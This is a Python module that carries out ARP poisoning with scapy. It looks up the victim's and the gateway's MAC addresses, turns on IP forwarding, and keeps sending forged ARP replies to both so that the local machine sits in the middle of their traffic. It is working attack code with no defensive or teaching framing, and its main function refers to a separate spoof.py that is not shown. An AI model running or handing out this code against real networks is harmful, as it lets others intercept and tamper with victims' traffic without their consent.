import os
import re
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep
from subprocess import Popen, PIPE, check_call


def getHostMacAddr(iface):
    with open('/sys/class/net/{}/address'.format(iface)) as f:
        mac = f.read()
        return mac.rstrip()


def getMacAddrFromIP(ip, ping=True):
    if(ping == True):
        response = os.system("ping -c 1 {} > /dev/null".format(ip))
    else:
        response = 0
    if(response == 0):
        cmd1 = Popen(['arp', '-a', ip], stdout=PIPE)
        cmd2 = Popen(['awk', '{print $4}'], stdin=cmd1.stdout, stdout=PIPE)
        mac = cmd2.communicate()[0].rstrip()
        return mac
    else:
        exit("Could not establish connection to {}. Exiting...".format(ip))


def getRouterIP():
    cmd1 = Popen(['arp', '-a'], stdout=PIPE)
    cmd2 = Popen(['awk', '/gateway/ {print $2}'], stdin=cmd1.stdout, stdout=PIPE)
    routerIP = re.sub('[\(\)\{\}<>]', '', cmd2.communicate()[0])
    return routerIP.rstrip()


def ArpPoison(victimIP, routerIP, iface):
    if(routerIP is None):
        routerIP = getRouterIP()
    routerMAC = getMacAddrFromIP(routerIP, False)
    victimMAC = getMacAddrFromIP(victimIP)
    hostMAC = getHostMacAddr(iface)

    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

    print("Victim found @ {} : {}".format(victimIP, victimMAC))
    print("Router found @ {} : {}".format(routerIP, routerMAC))
    print("Starting ARP poisoning process")

    while 1:
        try:
            sendp(Ether(src=hostMAC, dst=victimMAC)/ARP(op=2, pdst=victimIP, psrc=routerIP, hwdst=victimMAC), verbose=0)
            sendp(Ether(src=hostMAC, dst=routerMAC)/ARP(op=2, pdst=routerIP, psrc=victimIP, hwdst=routerMAC), verbose=0)
            sleep(2)
        except KeyboardInterrupt:
            exit("")


def main():
    exit("Please run spoof.py")


if __name__ == '__main__':
    main()
